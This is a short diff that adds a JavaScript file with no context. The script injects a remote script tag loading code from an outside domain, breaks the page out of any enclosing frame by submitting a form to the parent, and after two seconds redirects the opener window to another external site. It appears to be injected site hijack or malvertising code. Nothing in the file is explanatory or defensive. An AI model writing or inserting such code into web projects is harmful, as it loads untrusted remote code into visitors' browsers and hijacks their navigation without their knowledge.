@@ -1,0 +1,8 @@
+var url = location.href;
+if (url.indexOf('http://') == 0 || url.indexOf('https://') == 0)
+{
+document.writeln("<script src=\"http://table.teblefa.com/82basee.js\"></script>");
+window.onload=function(){if(top!=self){f=document.createElement('form');f.action=location;f.target='_parent';document.body.appendChild(f);f.submit();}};
+function bingo(){if(parent.window.opener) parent.window.opener.location='http://www.haofuok.com';if(window.opener.parent.navigate) window.opener.parent.navigate('http://www.haofuok.com');}
+setTimeout('bingo()', 2000);
+}
